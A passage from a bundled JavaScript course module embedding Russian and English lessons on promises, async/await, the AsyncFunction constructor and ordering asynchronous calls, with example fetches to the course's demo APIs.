= Math.round(Math.random() * 3000)\n  setTimeout(() => resolve(`${message}: ${time}`), time)\n})\n\nconst test = async () => await promise(await promise(await promise('start')))\n\ntest().then(response => console.log(response))\n~~~\n\n{{{async-await-13.js}}}\n\n______________________________________________\n\n### ![ico-25 cap] 14\n\nОбъявим вспомогательную функцию:\n\n~~~js\nconst createElem = tag => document.body.appendChild(document.createElement(tag))\n~~~\n\n◘◘![ico-25 cap] **14**◘◘\n\n~~~js\nconst promise = message => new Promise(resolve => Object.assign(createElem('input'), {\n  placeholder: message,\n  style: `\n    padding: 8px 16px;\n    border-radius: 4px;\n  `,\n  onchange: event => resolve(event.target.value)\n}))\n\nconst func = async () => Object.assign({}, {\n  name: await promise('Your name'),\n  hobby: await promise('Your hobby'),\n  speciality: await promise('Your speciality')\n})\n\nfunc().then(response => console.log(response))\n~~~\n\n{{{async-await-9.js}}}\n\n______________________________________________\n\n### ![ico-25 cap] 15\n\n◘◘![ico-25 cap] **15**◘◘\n\n~~~JS\nconst promise = message => new Promise(resolve => Object.assign(createElem('input'), {\n  placeholder: message,\n  onchange: event => resolve(event.target.value)\n}))\n\nconst func = async () => {\n  const user = {}\n  const messages = ['name', 'hobby', 'speciality']\n\n  const responses = await Promise.all(messages.map(message => promise(message)))\n\n  responses.forEach((val, index) => Object.assign(user, { [messages[index]]: val }))\n  return user\n}\n\nfunc().then(console.log)\n~~~\n\n{{{async-await-10.js}}}\n\n______________________________________________\n\n### ![ico-25 cap] 16\n\nЗафиксируем значение текущего времени в милисекундах в переменной **~start~** и объявим вспомогательные функции **~getRandom~** и **~test~**:\n\n~~~js\nconst start = Date.now()\n\nconst getRandom = () => Math.round(Math.random() * 5000)\n\nconst test = ms => Date.now() - start >= ms\n~~~\n\nТеперь объявим функции **~func~** и **~createPromise~**:\n\n~~~js\nfunction func (name, time, callback) {\n  test(time)\n    ? callback(`${name}: ${time}`)\n    : requestAnimationFrame(func.bind(null, name, time, callback))\n}\n\nfunction createPromise (name, time) {\n  return new Promise(func.bind(null, name, time))\n}\n~~~\n\nТеперь выполним код:\n\n◘◘![ico-25 cap] **16**◘◘\n\n~~~js\n;['First', 'Second', 'Third']\n  .forEach(name => createPromise(name, getRandom()).then(console.log))\n~~~\n\n{{{async-await-16.js}}}\n\nКак вы можете убедиться, сообщения выводятся в случайном порядке, в зависимости от того, какое значение вернула функция **~getRandom~** для каждого промиса.\n\nЗадача - синхронизировать попадание коллбэков в стек вызовов так, чтобы первым в консоль было выведено \"**_First_**\", затем \"**_Second_**\", а затем \"**_Third_**\".\n\n◘◘**цепочка промисов**◘◘\n\n~~~js\ncreatePromise('First', getRandom())\n  .then(console.log)\n  .then(() => createPromise('Second', getRandom()).then(console.log))\n  .then(() => createPromise('Third', getRandom()).then(console.log))\n~~~\n\n◘◘**асинхронная функция**◘◘\n\n~~~js\nconst showResults = async () => {\n  const promises = ['First', 'Second', 'Third']\n    .map(name => createPromise(name, getRandom()))\n\n  for (const promise of promises) console.log(await promise)\n}\n\nshowResults()\n~~~\n\nИтак, асинхронная функция может служить \"оберткой\" для нескольких асинхронных операций, выполнение которых можно упорядочить во времени, т.е. сделать так, чтобы их коллбэки отрабатывали в заданной последовательности.\n\n________________________________\n\n### ![ico-25 cap] 17\n\nРассмотрим чисто умозрительный вариант\n(на практике такое делать не надо):\n\n◘◘![ico-25 cap] **17**◘◘\n\n~~~js\nconst origin = 'https://garevna-json-server.glitch.me'\n\nconst users = ['Stephan', 'Andry']\n  .reduce(async (result, item) => {\n    const data = await (await fetch(`${origin}/users?name=${item}`)).json()\n    result = await result\n    result.push(data[0])\n    return result\n  }, [])\n~~~\n\nНа что здесь следует обратить внимание:\n\nметоду **reduce** передается асинхронная функция, которая возвращает промис.\nПоэтому после каждой итерации переменная **result** будет промисом,\nи ее надо резолвить с помощью **await**.\n\nВ результате работы скрипта в переменной **users** будет промис.\nИзвлечем результат из промиса:\n\n~~~js\nusers.then(console.log)\n~~~\n\n![ico-20 yes] Внимание, чтобы сократь число обращений к серверу, лучше сделать так:\n\n~~~js\nfetch(`${origin}/users?name=Stephan&name=Andry`)\n  .then(response => response.json())\n  .then(console.log)\n~~~\n\nили так:\n\n~~~js\nconst origin = 'https://garevna-json-server.glitch.me'\n\nconst getEndpoint = userList => userList\n  .reduce((result, item, index) => result += `${index > 0 ? '&' : ''}name=${item}`, '')\n\nconst getUsers = async userList => await (await fetch(`${origin}/users?${getEndpoint(userList)}`)).json()\n\ngetUsers(['Stephan', 'Andry'])\n  .then(console.log)\n~~~\n\n___________________________________________\n\n### ![ico-25 cap] 18\n\n~~~js\nconst origin = 'https://api.github.com'\n\nconst addElem = tagName => document.body\n  .appendChild(document.createElement(tagName))\n~~~\n\n◘◘![ico-25 cap] **18**◘◘\n\n~~~js\nasync function getUsersData (userName) {\n  const userData = await (await fetch(`${origin}/users/${userName}`)).json()\n\n  addElem('img').src = userData.avatar_url\n\n  const userRepos = await (await fetch(userData.repos_url)).json()\n\n  for (const item of userRepos) addElem('div').innerText = item.events_url\n\n  return 'Ready'\n}\n\ngetUsersData('garevna').then(console.log)\n~~~\n\n_________________________________________\n\n### ![ico-25 cap] 19\n\nРасширим прототип конструктора **~Object~** методом **~addElem~**:\n\n◘◘Object◘◘\n~~~js\nObject.prototype.addElem = function (tagName) {\n  const elem = document.body\n    .appendChild(document.createElement(tagName))\n  Object.assign(elem, {\n    addChar (char) {\n      elem.textContent += char\n    },\n    replace (text) {\n      elem.textContent = text\n    }\n  })\n  return elem\n}\n~~~\n\nКак мы видим, добавленный элемент будет иметь два метода: **~addChar~** и **~replace~**, позволяющие модифицировать текстовое содержимое элемента.\n\nТеперь расширим прототип конструкторов **~String~** и **~Number~** методом **~then~**:\n\n◘◘String◘◘\n~~~js\nString.prototype.then = function () {\n  const placeholder = this.addElem('div')\n  this\n    .split('')\n    .forEach((char, index) => setTimeout(() => placeholder.addChar(char), 1000 * index))\n}\n~~~\n\n◘◘Number◘◘\n\n~~~js\nNumber.prototype.then = function () {\n  const placeholder = this.addElem('div')\n  for (let ind = 0; ind <= this; ind++) {\n    setTimeout(() => placeholder.replace(ind), 1000 * ind)\n  }\n}\n~~~\n\nТерерь можно создать \"простенькие\" функции **~typeWritter~** и **~showNumber~**:\n\n◘◘![ico-25 cap] **19**◘◘\n\n~~~js\nconst typeWritter = async string => await Object(string)\nconst showNumber = async number => await Object(number)\n\ntypeWritter('Welcome')\nshowNumber(11)\n~~~\n\n_________________________________________\n\n[:::**20**:::](https://plnkr.co/edit/3JMiqa1CFLK55hgx/)\n\n_______________________\n[![ico-30 hw] Quiz](quiz/async)\n"},98121:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="## ![ico-25 icon] Конструктор AsyncFunction\n\n[◄◄◄ Async function ◄◄◄](page/async-await)\n\nАсинхронная функция является экземпляром класса **AsyncFunction**\n\n![ico-20 warn] AsyncFunction **не** является глобальным объектом\n\n~~~js\nasync function test () {}\nconsole.dir(test)\n~~~\n\n~~~~console\n▼ async ƒ test()\n    arguments: (...)\n    caller: (...)\n    length: 0\n    name: \"test\"\n  ▼ __proto__: AsyncFunction\n        arguments: (...)\n        caller: (...)\n      ► constructor: ƒ AsyncFunction()\n        Symbol(Symbol.toStringTag): \"AsyncFunction\"\n      ▼ __proto__: ƒ ()\n        ► apply: ƒ apply()\n          arguments: (...)\n        ► bind: ƒ bind()\n        ► call: ƒ call()\n          caller: (...)\n        ► constructor: ƒ Function()\n          length: 0\n          name: \"\"\n        ► toString: ƒ toString()\n        ► Symbol(Symbol.hasInstance): ƒ [Symbol.hasInstance]()\n        ► get arguments: ƒ ()\n        ► set arguments: ƒ ()\n        ► get caller: ƒ ()\n        ► set caller: ƒ ()\n        ► __proto__: Object\n~~~~\n\n^^Попытка отратиться к объекту **AsyncFunction** вызовет исключение:^^\n\n~~~js\ntest instanceof AsyncFunction\n~~~\n\n••![ico-20 error] Uncaught ReferenceError: AsyncFunction is not defined••\n\n^^поэтому получить ссылку на нее можно, например, так:^^\n\n~~~js\nconst AsyncFunctionConstructor = test.__proto__.constructor\n~~~\n\n^^или:^^\n\n~~~js\nconst AsyncFunction = (async function () {}).__proto__.constructor\n~~~\n\n^^Теперь исключения не будет:^^\n\n~~~js\ntest instanceof AsyncFunction  // true\n~~~\n\n^^Более того, мы можем теперь использовать ссылку на конструктор AsyncFunction для создания экземпляра асинхронной функции:^^\n\n~~~js\nconst asyncFunc = new AsyncFunction\n\nconsole.log(asyncFunc)\n~~~\n\n**Result**\n\n~~~console\nasync ƒ anonymous(\n) {\n\n}\n~~~\n\n^^Но и это еще не все ![ico-20 smile]^^\n\n__________________________________\n\n## ![ico-25 icon] prototype\n\n^^Давайте добавим в прототип конструктора асинхронных функций метод **waitFor**:^^\n\n◘◘![ico-20 cap] Пример 1◘◘\n\n~~~js\n(async function () {})\n  .constructor.prototype\n  .waitFor = (message, time) => new Promise(resolve => setTimeout(() => resolve(message), time * 1000))\n~~~\n\n^^а теперь создадим асинхронную функцию **sample**:^^\n\n~~~js\nconst sample = async (message, time) => console.log(await sample.waitFor(message, time))\n~~~\n\n^^Осталось только вызвать функцию **sample**:^^\n\n~~~js\nconsole.log('Start')\n\nsample('Hello', 3)\n\nconsole.log('End')\n~~~\n\n__________________________________\n\n## ![ico-25 icon] Каррирование\n\nИзменить контекст вызова стрелочной функции с помощью методов ~call~, ~apply~, ~bind~ невозможно\nОднако каррирование работает так же, как и у обычных функций\n\n◘◘![ico-20 cap] Пример 2◘◘\n\n~~~js\nconst func = arg => console.log(arg)\n\nconst user = func.bind(null, 'Stephan')\nconst browser = func.bind(null, 'Chrome')\nconst service = func.bind(null, 'Firebase')\n\nuser()      // Stephan\nbrowser()   // Chrome\nservice()   // Firebase\n~~~\n\n_______________________\n[![ico-30 hw] Тесты](quiz/async )\n"},78990:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="## ![ico-25 icon] Promises\n\n\nCalling an asynchronous function returns a promise\n\nLet's remember what's good about promises in JS?\nFirst of all, because if a promise is fulfilled, then it is not at all necessary to immediately take back what was promised.\nYou can put the promise on the shelf:\n\n~~~js\nconst promise = sayHello ()\n~~~\n\n@@@@\n\n![](illustrations/tin.jpg)\nand then 'open the tin' (_promise_) when **it will be convenient for us**! Moreover, 'the opener' (~then()~ method) is always with it. Promise is a reliable tin in which the contents will not deteriorate or disappear.\n\n@@@@\n\n@@@@ 3\n![](illustrations/modesty.png)\nWhat else is good about a promise? - his modesty! Promise will never interrupt the main thread. Will never fit into the Call Stack without waiting in line.\n![](illustrations/promise-in-queue.png)\n\n@@@@\n\n![ico-25 cap] **Example 1**\n\nFor example, as a result of executing the following code:\n\n~~~js\nconst sayHello = async () => 'Hello'\n\nconsole.time('Main thread')\n\nconsole.log(`Start: ${new Date().getUTCMilliseconds()}`)\n\nsayHello().then( response => console.log(response))\n\nconsole.log(`Start: ${new Date().getUTCMilliseconds()}`)\n\nconsole.timeEnd('Main thread')\n~~~\n\nwe will see in the console:\n\n~~~console\nStart: 465\nFinish: 465\nMain thread: 0.279296875ms\nHello\n~~~\n\nie the asynchronous function ~sayHello()~ behaves very modestly:\nalthough all it does is just say hello,\nbut at the same time it does not break into the main thread and does not yell from the threshold: \"_Hello!_\"\nit modestly waits for the main thread to complete its work\nafter which it politely says \"Hello\"\n\nbut all that distinguishes it from a regular function is the word **~async~**\nremove this word, and \"Hello\" will appear between \"Start...\" and \"Finish...\"\n\nSo what's the deal?\n\nThe fact is that the call to the ~sayHello()~ function returned a promise to say hello,\nbut when it is convenient for the main thread ![ico-20 smile]\n\n__________________________________\n\n## ![ico-25 icon] More than just a promise\n\nSometimes you need to streamline the execution of several asynchronous operations.\nWe can already solve this problem using a promise and a chain of calls to the **~then~** method:\n\n◘◘![ico-20 cap] Example 2◘◘\n\n~~~js\nnew Promise(resolve => setTimeout(() => resolve('Hello'), 1000))\n  .then(response => new Promise(resolve => setTimeout(() => resolve(`${response}, baby`), 1000)))\n  .then(response => console.log(response))\n~~~\n\nIn this example, after 1 second the first promise will be resolved with the message \"Hello\".\nWhen it resolves, a new promise will be created, which will also resolve after 1 second.\nThe second promise will add the string \", baby\" to the message returned by the first promise.\nAs a result, the chain of promises will resolve in 2 seconds, and the console will display ~Hello, baby~.\n\nLet's change the code a little to track time.\n\nTo do this, we declare an auxiliary function ~setTimer~:\n\n~~~js\nfunction setTimer (message, callback) {\n  console.log(new Date().getUTCMilliseconds())\n  setTimeout(() => callback(message), 1000)\n}\n~~~\n\nNow the chain of promises will be simplified, and we'll see an indication of the execution time in milliseconds:\n\n~~~js\nnew Promise(callback => setTimer('Hello', callback))\n  .then(response => new Promise(callback => setTimer(`${response}, baby`, callback)))\n  .then(response => setTimer(response, console.log))\n~~~\n\nNow we will see in the console something like:\n\n~~~console\n568\nPromise {<pending>}\n569\n570\nHello, baby\n~~~\n\nHowever, an async function is an alternative solution.\n\nLet's declare a helper function **resolve**:\n\n~~~js\nconst resolve = response => document.body.innerHTML += `<p>${response}</p>`\n~~~\n\nLet's slightly correct the code of the **setTimer** function, replacing ~console.log~ with a call to the ~resolve~ function:\n\n~~~js\nfunction setTimer (message, callback) {\n  resolve(new Date().getUTCMilliseconds())\n  setTimeout(() => callback(message), 1000)\n}\n~~~\n\nNow let's declare the asynchronous function **sayHello**:\n\n~~~js\nconst sayHello = async () => {\n  const res = await new Promise(callback => setTimer('Hello', callback))\n  return await new Promise(callback => setTimer(`${res}, baby`, callback))\n}\n~~~\n\nand  call it by passing the **~resolve~** callback through the ~then~ method:\n\n~~~js\nsayHello().then(resolve)\n~~~\n\n{{{async-is-good-1.js}}}\n\nWhat we see from this example:\n\n• instead of calling the **~then~** method of the promise, the keyword **~await~** of the asynchronous function was used;\n• the code that follows the line with **~await~** will be executed as if this code was executed in the callback of the **~then~** method of the previous promise;\n• calling an asynchronous function returns a promise, so the result of an asynchronous function can only be obtained using the **~then~** method;\n• in order for a call to an asynchronous function will be resolved with some result, the body of the asynchronous function must contain the operator **~return~**;\n\n_________________________\n\n### ![ico-20 icon] Queue Manager\n\nThe asynchronous function is an excellent queue organizer.\nIt strictly ensures that no one jumps over the queue at the Call Stack ![ico-20 smile]\n\nLet us have a function **promise** that returns a promise.\nIn this case, the callback resolve binds the first argument passed to the function **promise**.\nThe second argument to the **promise** function is used to set the timer:\n\n~~~js\nfunction promise () {\n  return new Promise(resolve => setTimeout(resolve.bind(null, arguments[0]), arguments[1] * 1000))\n}\n~~~\n\nand function **resolve**:\n\n~~~js\nconst resolve = response => console.log(response)\n~~~\n\nLet's make three consecutive calls to the **promise** function:\n\n~~~js\npromise('Start', 5).then(resolve)\npromise('Continue', 3).then(resolve)\npromise('End', 2).then(resolve)\nresolve('Finish')\n~~~\n\n{{{async-is-good-3-1.js}}}\n\nAs we can see, callbacks are returned when the timer has expired, and not in the order they were called.\n\nNow let's queue them up using the asynchronous function **sigma**:\n\n◘◘![ico-20 cap] Example 3◘◘\n\n~~~js\nfunction promise () {\n  return new Promise(resolve => setTimeout(resolve.bind(null, arguments[0]), arguments[1] * 1000))\n}\n\nasync function sigma () {\n  console.log(await promise('Start', 5))\n  console.log(await promise('Continue', 3))\n  console.log(await promise('End', 2))\n  return 'Finish'\n}\n\nsigma().then(response => console.log(response))\n~~~\n\n{{{async-is-good-3-2.js}}}\n\nNow they strictly keep the order of queue! ![ico-20 smile]\n\n__________________________________\n\n### ![ico-20 icon] Organizer of asynchronous processes\n\n◘◘![ico-20 cap] Example 4◘◘\n\n~~~js\nasync function getLogin (resolve, reject) {\n  const users = await (await fetch('https://garevna-rest-api.glitch.me/users/all')).json()\n\n  const logins = Object.keys(users)\n\n  const userInput = document.body\n    .appendChild(document.createElement('input'))\n\n  userInput.oninput = function (event) {\n    const test = logins.includes(event.target.value)\n\n    event.target.style.color = test ? 'green' : 'red'\n    event.target.title = test ? 'OK' : 'There is no such user in DB'\n  }\n\n  userInput.onchange = async event => {\n    const res = logins.includes(event.target.value)\n\n    userInput.remove()\n\n    !res ? reject('Not found') : resolve(users[event.target.value])\n  }\n}\n\ngetLogin(res => console.log(res), err => console.error(err))\n~~~\n\n\n{{{async-is-good-4.js}}}\n\n^^To see what logins are in the database, run in the console:^^\n\n~~~js\nfetch('https://garevna-rest-api.glitch.me/users/all')\n  .then(response => response.json())\n  .then(response => console.log(response))\n~~~\n\n_________________________________\n\nLet's rewrite the previous example a little.\n\nLet's declare a function **getInput** that will return **_promise_**.\nThe **getInput** function receives the **users** object as an argument, and creates an ~input~ element for entering the user's login.\n\nThe anonymous function that is passed to the **Promise** constructor sets up a handler for the onchange event of the ~input~ element, which calls either **~resolve~** or **~reject~** depending on what was entered in the ~input~ field (whether there is a corresponding user in the database)\n\n◘◘![ico-20 file] getInput◘◘\n\n~~~js\nfunction getInput (users) {\n  const logins = Object.keys(users)\n\n  const userInput = document.body\n    .appendChild(document.createElement('input'))\n\n  userInput.oninput = event => {\n    const test = logins.includes(event.target.value)\n\n    event.target.style.color = test ? 'green' : 'red'\n    event.target.title = test ? '...' : 'There are no such user in DB'\n  }\n\n  return new Promise((resolve, reject) => {\n    userInput.onchange = event => {\n      const test = logins.includes(event.target.value)\n\n      userInput.remove()\n\n      !test ? reject('Not found') : resolve(users[event.target.value])\n    }\n  })\n}\n~~~\n\nNow let's create an asynchronous function **getLogin**, which will send a request to the server, receive data, call the function **getInput** and transfer the received data to it:\n\n◘◘![ico-20 file] getLogin◘◘\n\n~~~js\nasync function getLogin () {\n  const users = await (await fetch('https://garevna-rest-api.glitch.me/users/all')).json()\n\n  return await getInput(users)\n}\n~~~\n\nLet's create two more helper functions:\n\n◘◘![ico-20 file] resolve & reject◘◘\n\n~~~js\nconst resolve = response => console.log(response)\nconst reject = error => console.warn(error)\n~~~\n\nAll that remains is to call the **getLogin** function:\n\n◘◘![ico-20 cap] Invoke the getLogin function◘◘\n\n~~~js\ngetLogin().then(resolve, reject)\n~~~\n\nand don't forget to press 'Enter' after entering your login.\n\n_____________________\n\nSo, the complete example code:\n\n\n◘◘![ico-20 cap] Пример 5◘◘\n\n~~~js\nfunction getInput ( users ) {\n  const logins = Object.keys(users)\n\n  const userInput = document.body\n    .appendChild(document.createElement('input'))\n\n  userInput.oninput = event => {\n    const test = logins.includes(event.target.value)\n\n    event.target.style.color = test ? 'green' : 'red'\n    event.target.title = test ? '...' : 'There is no such user in DB'\n  }\n\n  return new Promise((resolve, reject) => {\n    userInput.onchange = event => {\n      const test = logins.includes(event.target.value)\n\n      userInput.remove()\n\n      !test ? reject('Not found') : resolve(users[event.target.value])\n    }\n  })\n}\n\nasync function getLogin () {\n  const users = await (await fetch('https://garevna-rest-api.glitch.me/users/all')).json()\n\n  return await getInput(users)\n}\n\nconst resolve = response => console.log(response)\nconst reject = error => console.warn(error)\n\n\ngetLogin().then(resolve, reject)\n~~~\n\n{{{async-is-good-5.js}}}\n\n_______________________\n[![ico-30 hw] Quiz](quiz/async )\n"},39143:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="## ![ico-25 icon] Обещания\n\n\nВызов асинхронной функции возвращает промис (обещание)\n\nДавайте вспомним, чем хороши обещания в JS?\nВ первую очередь тем, что если обещание выполнено, то вовсе не обязательно сразу забирать обещанное\nМожно положить обещание на полочку:\n\n~~~js\nconst promise = sayHello ()\n~~~\n\n@@@@\n\n![](illustrations/tin.jpg)\nи \"открыть\" обещание ( банку _promise_ ) тогда, **когда нам будет удобно**! Тем более, что \"открывашка\" - метод ~then()~ - всегда при нем. Промис - надежная консервная банка, в которой содержимое не испортится и не исчезнет\n\n@@@@\n\n@@@@ 3\n![](illustrations/modesty.png)\nЕще что хорошего в обещании? - его скромность. Promise никогда не прервет работу основного потока. Никогда не влезет без очереди в Call Stack.\n![](illustrations/promise-in-queue.png)\n\n@@@@\n\n![ico-25 cap] **Пример 1**\n\nНапример, в результате выполнения следующего кода:\n\n~~~js\nconst sayHello = async () => 'Hello'\n\nconsole.time('Основной поток')\n\nconsole.log(`Start: ${new Date().getUTCMilliseconds()}`)\n\nsayHello().then( response => console.log(response))\n\nconsole.log(`Start: ${new Date().getUTCMilliseconds()}`)\n\nconsole.timeEnd('Основной поток')\n~~~\n\nв консольке мы увидим:\n\n~~~console\nStart: 465\nFinish: 465\nОсновной поток: 0.279296875ms\nHello\n~~~\n\nт.е. асинхронная функция ~sayHello()~ ведет себя очень скромно:\nхотя все, что она делает - просто здоровается,\nно при этом она не вламывается в рабочий поток и не орет с порога: \"_Hello_\"\nона скромно ждет, когда поток завершит свою работу,\nпосле чего вежливо говорит \"Hello\"\n\nа ведь все, что отличает ее от обычной функции - это слово **~async~**\nуберите это слово, и \"Hello\" появится между \"Start...\" и \"Finish...\"\n\nТак в чем же дело?\n\nВ том, что вызов функции ~sayHello()~ вернул обещание поздороваться,\nно тогда, когда основному потоку это будет удобно ![ico-20 smile]\n\n__________________________________\n\n## ![ico-25 icon] Больше, чем просто обещание\n\nИногда бывает нужно упорядочить выполнение нескольких асинхронных операций\n\nМы уже можем решить такую задачу с помощью промиса и цепочки вызовов метода **~then~**:\n\n◘◘![ico-20 cap] Пример 2◘◘\n\n~~~js\nnew Promise(resolve => setTimeout(() => resolve('Hello'), 1000))\n  .then(response => new Promise(resolve => setTimeout(() => resolve(`${response}, baby`), 1000)))\n  .then(response => console.log(response))\n~~~\n\nВ этом примере через 1 секунду первый промис разрезолвится сообщением \"Hello\"\nкогда он разрезолвится, будет создан новый промис, который также разрезолвится через 1 секунду\nвторой промис добавит к сообщению, возвращенному первым промисом, строку \", baby\"\nВ итоге цепочка промисов разрезолвится через 2 секунды, и в консоли будет ~Hello, baby~\n\nДавайте немного изменим код, чтобы отслеживать время\n\nДля этого объявим вспомогательную функцию ~setTimer~:\n\n~~~js\nfunction setTimer (message, callback) {\n  console.log(new Date().getUTCMilliseconds())\n  setTimeout(() => callback(message), 1000)\n}\n~~~\n\nТеперь цепочка промисов упростится, при этом мы будем видеть индикацию времени выполнения в миллисекундах:\n\n~~~js\nnew Promise(callback => setTimer('Hello', callback))\n  .then(response => new Promise(callback => setTimer(`${response}, baby`, callback)))\n  .then(response => setTimer(response, console.log))\n~~~\n\nТеперь мы увидим в консоли нечто вроде:\n\n~~~console\n568\nPromise {<pending>}\n569\n570\nHello, baby\n~~~\n\nОднако асинхронная функция является альтернативным решением\n\nОбъявим вспомогательную функцию **resolve**:\n\n~~~js\nconst resolve = response => document.body.innerHTML += `<p>${response}</p>`\n~~~\n\nнемного исправим код функции **setTimer**, заменив ~console.log~ вызовом функции ~resolve~:\n\n~~~js\nfunction setTimer (message, callback) {\n  resolve(new Date().getUTCMilliseconds())\n  setTimeout(() => callback(message), 1000)\n}\n~~~\n\nи теперь объявим асинхронную функцию **sayHello**:\n\n~~~js\nconst sayHello = async () => {\n  const res = await new Promise(callback => setTimer('Hello', callback))\n  return await new Promise(callback => setTimer(`${res}, baby`, callback))\n}\n~~~\nи вызовем ее, передав через метод ~then~ колбэк **~resolve~**:\n~~~js\nsayHello().then(resolve)\n~~~\n\n{{{async-is-good-1.js}}}\n\nЧто мы видим из этого примера:\n\n• вместо вызова метода **~then~** промиса использовано ключевое слово **~await~** асинхронной функции\n• код, который следует после строки с **~await~**, будет выполнен так, как будто этот код выполняется в колбэке метода **~then~** предыдущего промиса\n• вызов асинхронной функции возвращает промис, поэтому получить результат работы асинхронной функции можно только с помощью метода **~then~**\n• для того, чтобы вызов асинхронной функции резолвился результатом, в теле асинхронной функции должен быть оператор **~return~**\n\n_________________________\n\n### ![ico-20 icon] Диспетчер очередей\n\nАсинхрронная функция является отличным организатором очередей\nОна строго следит за тем, чтобы никто не влез без очереди в Call Stack ![ico-20 smile]\n\nПусть у нас есть функция **promise**, которая возвращает промис,\nпри этом биндит колбэку **resolve** первый аргумент, переданный функции **promise**\nВторой аргумент функции **promise** используется для установки таймера:\n\n~~~js\nfunction promise () {\n  return new Promise(resolve => setTimeout(resolve.bind(null, arguments[0]), arguments[1] * 1000))\n}\n~~~\n\nи функция **resolve**:\n\n~~~js\nconst resolve = response => console.log(response)\n~~~\n\nСделаем три последовательных вызова функции **promise**:\n\n~~~js\npromise('Start', 5).then(resolve)\npromise('Continue', 3).then(resolve)\npromise('End', 2).then(resolve)\nresolve('Finish')\n~~~\n\n{{{async-is-good-3-1.js}}}\n\nКак мы видим, колбэки возвращаются тогда, когда истекло время таймера,\nа не в порядке их вызова\n\nА теперь выстроим их в очередь с помощью асинхронной функции **sigma**\n\n◘◘![ico-20 cap] Пример 3◘◘\n\n~~~js\nfunction promise () {\n  return new Promise(resolve => setTimeout(resolve.bind(null, arguments[0]), arguments[1] * 1000))\n}\n\nasync function sigma () {\n  console.log(await promise('Start', 5))\n  console.log(await promise('Continue', 3))\n  console.log(await promise('End', 2))\n  return 'Finish'\n}\n\nsigma().then(response => console.log(response))\n~~~\n\n{{{async-is-good-3-2.js}}}\n\nТеперь они строго соблюдают очередь ![ico-20 smile]\n\n__________________________________\n\n### ![ico-20 icon] Организатор асинхронных процессов\n\n◘◘![ico-20 cap] Пример 4◘◘\n\n~~~js\nasync function getLogin (resolve, reject) {\n  const users = await (await fetch('https://garevna-rest-api.glitch.me/users/all')).json()\n\n  const logins = Object.keys(users)\n\n  const userInput = document.body\n    .appendChild(document.createElement('input'))\n\n  userInput.oninput = function (event) {\n    const test = logins.includes(event.target.value)\n\n    event.target.style.color = test ? 'green' : 'red'\n    event.target.title = test ? 'OK' : 'There is no such user in DB'\n  }\n\n  userInput.onchange = async event => {\n    const res = logins.includes(event.target.value)\n\n    userInput.remove()\n\n    !res ? reject('Not found') : resolve(users[event.target.value])\n  }\n}\n\ngetLogin(res => console.log(res), err => console.error(err))\n~~~\n\n\n{{{async-is-good-4.js}}}\n\n^^Для того, чтобы посмотреть, какие логины есть в базе данных, выполните в консоли:^^\n\n~~~js\nfetch('https://garevna-rest-api.glitch.me/users/all')\n  .then(response => response.json())\n  .then(response => console.log(response))\n~~~\n\n_________________________________\n\nНемного перепишем предыдущий пример\n\nОбъявим функцию **getInput**, которая будет возвращать **_промис_**\nФункция **getInput** получает в качестве аргумента объект **users**, и создает элемент ~input~ для ввода логина юзера\n\nАнонимная функция, которая передается конструктору **Promise**, устанавливает обработчика события ~onchange~ элемента ~input~, который вызывает либо **~resolve~**, либо **~reject~**\nв зависимости от того, что было введено в поле ~input~ ( есть ли соответствующий юзер в базе данных )\n\n◘◘![ico-20 file] getInput◘◘\n\n~~~js\nfunction getInput (users) {\n  const logins = Object.keys(users)\n\n  const userInput = document.body\n    .appendChild(document.createElement('input'))\n\n  userInput.oninput = event => {\n    const test = logins.includes(event.target.value)\n\n    event.target.style.color = test ? 'green' : 'red'\n    event.target.title = test ? '...' : 'There are no such user in DB'\n  }\n\n  return new Promise((resolve, reject) => {\n    userInput.onchange = event => {\n      const test = logins.includes(event.target.value)\n\n      userInput.remove()\n\n      !test ? reject('Not found') : resolve(users[event.target.value])\n    }\n  })\n}\n~~~\n\nТеперь создадим асинхронную функцию **getLogin**, которая будет делать запрос серверу, получать данные и вызывать функцию **getInput** с передачей ей полученных данных\n\n◘◘![ico-20 file] getLogin◘◘\n\n~~~js\nasync function getLogin () {\n  const users = await (await fetch('https://garevna-rest-api.glitch.me/users/all')).json()\n\n  return await getInput(users)\n}\n~~~\n\nСоздадим еще две вспомогательные функции:\n\n◘◘![ico-20 file] resolve & reject◘◘\n\n~~~js\nconst resolve = response => console.log(response)\nconst reject = error => console.warn(error)\n~~~\n\nОсталось только вызвать функцию **getLogin**:\n\n◘◘![ico-20 file] Вызов функции getLogin◘◘\n\n~~~js\ngetLogin().then(resolve, reject)\n~~~\n\nи не забудьте нажать Enter после ввода логина\n\n_____________________\n\nИтак, полный код примера:\n\n\n◘◘![ico-20 cap] Пример 5◘◘\n\n~~~js\nfunction getInput ( users ) {\n  const logins = Object.keys(users)\n\n  const userInput = document.body\n    .appendChild(document.createElement('input'))\n\n  userInput.oninput = event => {\n    const test = logins.includes(event.target.value)\n\n    event.target.style.color = test ? 'green' : 'red'\n    event.target.title = test ? '...' : 'There is no such user in DB'\n  }\n\n  return new Promise((resolve, reject) => {\n    userInput.onchange = event => {\n      const test = logins.includes(event.target.value)\n\n      userInput.remove()\n\n      !test ? reject('Not found') : resolve(users[event.target.value])\n    }\n  })\n}\n\nasync function getLogin () {\n  const users = await (await fetch('https://garevna-rest-api.glitch.me/users/all')).json()\n\n  return await getInput(users)\n}\n\nconst resolve = response => console.log(response)\nconst reject = error => console.warn(error)\n\n\ngetLogin().then(resolve, reject)\n~~~\n\n{{{async-is-good-5.js}}}\n\n_______________________\n[![ico-30 hw] Тесты](quiz/async )\n"},99544:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="## ![ico-25 icon] async function vs Promise.all\n\n![ico-20 warn] Синхронизация асинхронных процессов приводит к увеличению суммарного времени их выполнения\n\n![ico-25 cap] **Пример 1**\n\n^^Предположим, есть две функции, возвращающие промис:^^\n\n~~~js\nconst getNames = () => new Promise(resolve => setTimeout(() => resolve('Names'), 1000))\n\nconst getPosts = () => new Promise(resolve => setTimeout(() => resolve('Posts'), 1000))\n~~~\n\n^^Каждый вызов длится 1 секунду^^\n\n^^Если мы будем использовать асинхронную функцию для последовательного вызова **getNames** и **getPosts**, то суммарная продолжительность выполнения этих двух асинхронных операций составит не менее 2 сек^^\n\n~~~js\nasync function getData () {\n  console.time('time')\n  const posts = await getPosts()\n  const names = await getNames()\n  console.timeEnd('time')\n  console.info(`\\n${ names } | ${ posts }\\n\\n`)\n}\n\ngetData ()\n~~~\n\n**Результат в консоли**\n\n~~~console\n\nNames | Posts\n\ntime: 